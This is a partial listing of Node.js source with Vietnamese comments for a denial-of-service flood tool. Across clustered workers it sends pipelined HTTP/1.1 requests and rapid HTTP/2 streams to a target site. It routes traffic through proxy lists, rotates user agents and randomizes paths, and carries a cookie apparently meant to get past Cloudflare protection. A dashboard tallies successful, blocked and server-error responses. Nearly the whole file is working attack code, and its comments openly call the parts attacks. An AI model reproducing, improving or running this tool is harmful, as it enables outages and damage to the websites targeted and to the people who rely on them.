...
process.on('uncaughtException', function (exception) {
    // console.log("LỖI NGẦM:", exception.message); // Bỏ dấu // ở đầu để xem lỗi
});
...
// --- BƯỚC 1: SỬA KHAI BÁO PROXY ĐỂ NHẬN CHỮ 'none' ---
const isNoProxy = args.proxyFile === 'none' || args.proxyFile === '--noproxy';
var proxies = [];
if (!isNoProxy) {
    if (fs.existsSync(args.proxyFile)) {
        proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(Boolean);
    } else {
        console.log(`\x1b[31m[!] Không tìm thấy file proxy: ${args.proxyFile}\x1b[0m`);
        process.exit(1);
    }
}
...
if (cluster.isMaster) {
    ...
    try {
        if (fs.existsSync('ua.txt')) {
            userAgents = fs.readFileSync('ua.txt', 'utf8').split(/\r?\n/).map(ua => ua.trim()).filter(Boolean);
            console.log(`\x1b[32m[INFO] Đã nạp ${userAgents.length} User-Agents từ ua.txt\x1b[0m`);
        } else {
    ...
    // --- BẢNG ĐIỀU KHIỂN THỐNG KÊ (MASTER) ---
    let statusCodes = { "2xx": 0, "4xx": 0, "5xx": 0, "others": 0 };
    let lastTotal = 0;

    setInterval(() => {
        const currentTotal = statusCodes["2xx"] + statusCodes["4xx"] + statusCodes["5xx"] + statusCodes["others"];
        ...
        console.log(`   🌐 MODE: ${isNoProxy ? '\x1b[32mDIRECT (NO PROXY)\x1b[35m' : '\x1b[34mPROXY MODE\x1b[35m'}`);
        console.log(`   ⚡ PROTOCOL: \x1b[31mHTTP/2 ONLY (MAX RPS)\x1b[35m`);
        console.log(`   📈 CURRENT RPS: ${rps.toLocaleString()} req/s`);
        console.log("\x1b[35m----------------------------------------------------\x1b[0m");
        console.log(`   ✅ Success (200 OK)  : \x1b[32m${statusCodes["2xx"].toLocaleString()}\x1b[0m`);
        console.log(`   🚫 Blocked (403/429) : \x1b[33m${statusCodes["4xx"].toLocaleString()}\x1b[0m`);
        console.log(`   🔥 Server Err(500+)  : \x1b[31m${statusCodes["5xx"].toLocaleString()}\x1b[0m`);
        console.log("\x1b[35m====================================================\x1b[0m");
    }, 1000);

    for (let counter = 1; counter <= args.threads; counter++) {
        const worker = cluster.fork({ UA_LIST: JSON.stringify(userAgents) });
        
        // Nhận gói dữ liệu mã lỗi từ các Worker gửi về
        worker.on('message', (msg) => {
            if (msg.type === 'status_batch') {
                statusCodes["2xx"] += msg.s2xx;
                statusCodes["4xx"] += msg.s4xx;
                statusCodes["5xx"] += msg.s5xx;
                statusCodes["others"] += msg.sOthers;
            }
        });
    }
} 
else { 
    // --- WORKER: THỰC THI & GOM DỮ LIỆU ---
    const workerUA = JSON.parse(process.env.UA_LIST || "[]");
    
    // Lưu trữ số liệu nội bộ (Batching để cứu CPU 8 Core)
    let localStats = { "2xx": 0, "4xx": 0, "5xx": 0, "others": 0 };

    setInterval(() => {
        if (localStats["2xx"] > 0 || localStats["4xx"] > 0 || localStats["5xx"] > 0 || localStats["others"] > 0) {
            process.send({ 
                type: 'status_batch', 
                s2xx: localStats["2xx"], 
                s4xx: localStats["4xx"], 
                s5xx: localStats["5xx"], 
                sOthers: localStats["others"] 
            });
            localStats = { "2xx": 0, "4xx": 0, "5xx": 0, "others": 0 };
        }
    }, 500);

    // Kích hoạt mở luồng liên tục
    ...
    class NetSocket {
        ...
        HTTP(options, callback) {
            ...
            const payload = `CONNECT ${options.address}:${parsedPort} HTTP/1.1\r\nHost: ${options.address}:${parsedPort}\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n`;
    ...
    function runFlooder() {
        const finalUA = workerUA.length > 0 ? workerUA[Math.floor(Math.random() * workerUA.length)] : "Mozilla/5.0";
        const selectedMethod = Methods[Math.floor(Math.random() * Methods.length)];
        const selectedAccept = randomElement(accept_header);
        const selectedLang = randomElement(lang_header);
        const basePath = parsedTarget.path + (parsedTarget.path.includes("?") ? "&" : "?");

        // KHỐI 1: TẤN CÔNG HTTP/1.1 BẰNG RAW SOCKET (SIÊU NHẸ, SIÊU NHANH)
        const executeHttp1Attack = (socket) => {
            const attackInterval = setInterval(() => {
                let bulkPayload = "";
                // Nhồi nhét hàng loạt request vào một cục String duy nhất (Pipelining)
                for (let i = 0; i < args.Rate; i++) {
                    const dynamicPath = basePath + randomString(10);
                    bulkPayload += `${selectedMethod} ${dynamicPath} HTTP/1.1\r\nHost: ${parsedTarget.host}\r\nUser-Agent: ${finalUA}\r\nAccept: ${selectedAccept}\r\nAccept-Language: ${selectedLang}\r\nCookie: ${CookieCf}\r\nConnection: keep-alive\r\n\r\n`;
                }
                if (!socket.destroyed) {
                    socket.write(bulkPayload);
                }
            }, 100);

            // Đếm RPS bằng cách quét chuỗi phản hồi thô cực nhanh
            socket.on("data", (chunk) => {
                const res = chunk.toString("utf-8");
                if (res.includes("HTTP/1.1 2")) localStats["2xx"]++;
                else if (res.includes("HTTP/1.1 4")) localStats["4xx"]++;
                else if (res.includes("HTTP/1.1 5")) localStats["5xx"]++;
                else localStats["others"]++;
            });
        ...
        // KHỐI 2: TẤN CÔNG HTTP/2 (ĐÃ ĐƯỢC TỐI ƯU CỰC ĐẠI)
        const executeHttp2Attack = (tlsConn) => {
            const client = http2.connect(parsedTarget.href, { 
                protocol: "https:",
                createConnection: () => tlsConn,
                settings: { 
                    initialWindowSize: 15663105, // Mở rộng tối đa bộ đệm
                    maxFrameSize: 16384,
            ...
            client.on("connect", () => {
                const attackInterval = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        ...
                        request.on("response", (headers) => { 
                            ...
                            if (statusCode >= 200 && statusCode < 300) localStats["2xx"]++;
                            else if (statusCode >= 400 && statusCode < 500) localStats["4xx"]++;
                            else if (statusCode >= 500 && statusCode < 600) localStats["5xx"]++;
                            else localStats["others"]++;
                ...
                }, 100); // Tăng tần suất xả đạn lên 100ms
        ...
        // KHỐI 3: ALPN - CHUYỂN MẠCH GIAO THỨC THÔNG MINH
        const establishConnection = (proxySocket) => {
            if (parsedTarget.protocol === 'http:') {
                // Xử lý Localhost hoặc web không mã hóa cổng 80
                const port = parsedTarget.port || 80;
                const socket = proxySocket || net.connect(port, parsedTarget.hostname);
                if (!proxySocket) socket.on('connect', () => executeHttp1Attack(socket));
                else executeHttp1Attack(socket);
                socket.on('error', () => socket.destroy());
            } else {
                // Xử lý HTTPS cổng 443
                const tlsOptions = {
                    ALPNProtocols: ['h2', 'http/1.1'], // Báo cho server biết tool hỗ trợ cả 2
                ...
                const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions, () => {
                    // Kiểm tra kết quả đàm phán từ server
                    if (tlsConn.alpnProtocol === 'h2') {
                        executeHttp2Attack(tlsConn);
                    } else {
                        // Nếu server không có HTTP/2, bẻ lái sang HTTP/1.1 Raw Socket
                        executeHttp1Attack(tlsConn); 
                    }
                });
